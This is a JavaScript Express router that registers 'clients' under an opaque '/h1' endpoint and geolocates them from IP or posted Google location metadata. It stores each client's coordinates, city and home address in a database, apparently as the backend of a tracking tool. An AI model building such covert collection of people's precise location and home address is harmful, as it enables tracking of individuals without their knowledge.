const router = require('express').Router();
const Client = require('../tool.model');
const Utils = require('../../Utils/UtilFunctions/utilFunctions');
const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
const express = require("express");
const path = require("path");
const {GetClientLocationByIP, GetClientLocationByMetaData} = require("../../Utils/UtilFunctions/clientUtils");
const {GetClientLocationData} = require("../../Utils/UtilFunctions/clientUtils");
const {addClientLocation} = require("../../Utils/UtilFunctions/clientUtils");
const {createNewClient} = require("../../Utils/UtilFunctions/clientUtils");

//Add new client
router.route('/h1').post(async (req, res) => {
    let newClient = await createNewClient(req)
    newClient.save()
        .then(() => {
            res.cookie('session_id', newClient.session_key);
            res.send(newClient.client_id);
        })
        .catch(err => {
            Utils.LogToFile(err)
            res.sendStatus(403)
        });
    if (!newClient.wifiEnabled) {
        GetClientLocationByIP(newClient.public_ip).then((locationData) => {
            if (locationData)
                addClientLocation(newClient.client_id, locationData)
        }).catch((err) => Utils.LogToFile(err))
    }
})


router.use(toolCookieValidator);

//Push a new location for client
router.route('/location').post(async (req, res) => {
    try {
        let clientId = req.headers.clientid;
        let googleData = req.body;
        let location = await GetClientLocationByMetaData(googleData.response);
        res.send()
        let lat = location.lat;
        let lng = location.lng;
        GetClientLocationData(location).then((locationData) => {
            if (locationData) {
                Client.findOneAndUpdate({client_id: clientId}, {
                    location: {
                        lat: lat,
                        lng: lng,
                        country: locationData.country,
                        city: locationData.city,
                        home_address: locationData.home_address
                    }
                }, {useFindAndModify: false}, function (err) {
                    if (err)
                        Utils.LogToFile(`Error adding client ${clientId} location to database ${err.message}`)
                })
            }
        }).catch((err) => Utils.LogToFile(err))
    } catch (err) {
        Utils.LogToFile(err)
    }
})


module.exports = router;